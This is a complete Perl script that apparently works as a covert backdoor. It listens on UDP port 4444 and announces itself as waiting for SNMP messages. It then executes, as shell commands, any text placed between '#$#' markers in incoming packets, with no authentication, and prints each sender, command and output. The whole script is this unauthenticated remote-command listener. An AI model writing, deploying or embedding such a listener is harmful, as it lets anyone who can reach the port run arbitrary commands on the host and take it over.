#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;


my $sock = '';
my $max_length = 1500;  # Maximum packet length
my $port = 4444;	# Listening port
my $output = '';
my $cmd_out = '';
my $packet = '';

# Create listening socket
$sock = IO::Socket::INET->new(LocalPort => $port,Proto => 'udp') or die "Failed to bind socket: $@";
       
print "Waiting for SNMP messages on port $port\n\n";

while ($sock->recv($packet, $max_length)) {
    my($port, $ipaddr) = sockaddr_in($sock->peername);

    # Locate sender
    print "Command Received From :".inet_ntoa($ipaddr)."\n";

    # Locate command
    my $start = index($packet,'#$#')+length('#$#');
    my $end = index($packet,'#$#',$start);
    $output = substr($packet,$start,$end-$start);
    
    # Execute command and parse output to $cmd_out
    $cmd_out = `$output`;

    # Print command output
    print "Command Received      :$output\n";
    print "Command Output        :\n$cmd_out\n";
    
    # Flush buffers
    $output = '';
    $cmd_out = '';
} 
die "Receiver Error: $!";
